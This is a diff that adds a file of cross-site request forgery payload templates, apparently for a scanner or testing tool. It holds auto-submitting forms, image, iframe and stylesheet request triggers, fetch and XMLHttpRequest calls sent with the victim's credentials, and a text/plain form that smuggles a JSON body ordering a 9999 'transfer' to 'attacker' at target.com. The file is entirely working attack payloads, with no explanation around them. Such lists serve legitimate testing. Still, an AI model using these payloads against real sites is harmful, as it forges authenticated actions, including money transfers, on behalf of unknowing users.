@@ -1,0 +1,10 @@
+<form action="{url}" method="POST"><input name="{param}" value="{value}"><input type="submit" value="Submit"></form>
+<img src="{url}?{param}={value}">
+<script>fetch("{url}",{method:"POST",body:"{param}={value}",credentials:"include"})</script>
+<script>var x=new XMLHttpRequest();x.open("POST","{url}");x.withCredentials=true;x.send("{param}={value}")</script>
+<iframe src="{url}?{param}={value}"></iframe>
+<link rel="stylesheet" href="{url}?{param}={value}">
+<script>document.forms[0].submit()</script>
+<body onload="document.forms[0].submit()"><form action="{url}" method="POST"><input name="{param}" value="{value}"></form>
+<script>history.pushState('','','/');document.forms[0].submit()</script>
+<form action="https://target.com/update" method="POST" enctype="text/plain"><input name='{"action":"transfer","amount":"9999","to":"attacker"}' value='hack'></form>
